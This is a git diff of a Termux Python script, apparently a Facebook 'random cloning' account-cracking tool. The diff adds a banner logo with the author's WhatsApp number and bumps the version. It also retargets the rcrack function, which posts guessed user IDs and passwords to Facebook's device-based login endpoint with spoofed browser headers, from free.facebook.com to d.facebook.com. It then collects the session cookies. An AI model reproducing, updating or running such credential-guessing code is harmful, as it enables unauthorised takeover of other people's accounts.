@@ -126,11 +126,11 @@ os.system("espeak \"Wall come To MIRAJ KING termux world\"")
 logo =("""\033[0;92m
 
      	      \033[1;93m ─━<🌺Assalamu Alaikum🌺>━─\033[1;32m	           
-    \033[31;1m
-    \033[31;1m
-    \033[32;1m
-    \033[31;1m
-    \033[31;1m
+    \033[31;1m███    ███ ██   ██ 
+    \033[31;1m████  ████ ██  ██  
+    \033[32;1m██ ████ ██ █████   
+    \033[31;1m██  ██  ██ ██  ██  
+    \033[31;1m██      ██ ██   ██
     \033[33;1m
 \33[38;5;196m┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m⭐🌟 𝙈𝙀𝙃𝙀𝘿𝙄 🌟⭐\33[38;5;196m━━━━━━━━━━
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;96m        : [★] MIRAJ KHAN                                      
@@ -139,7 +139,7 @@ logo =("""\033[0;92m
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\x1b[1;96m  : [★]  Bangladeshi  
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\x1b[1;96m    : [★]  01780782237    
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;96m  : [★]  RANDOM-CLONING
-\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;96m: [★]  TRIAL  -𝗩-2 
+\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;96m: [★]  TRIAL  -𝗩-3
 \33[38;5;196m┗━━━━━━━━━━━━━━━━━━━\033[1;31m{{ M+K }} MIRAJ \33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""") 
 
 loop = 0
@@ -364,7 +364,7 @@ def rcrack(uid,pwx,tl):
 
             session = requests.Session()
 
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://d.facebook.com').text
 
             log_data = {
 
@@ -386,7 +386,7 @@ def rcrack(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'd.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -405,7 +405,7 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent':pro}
 
-            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
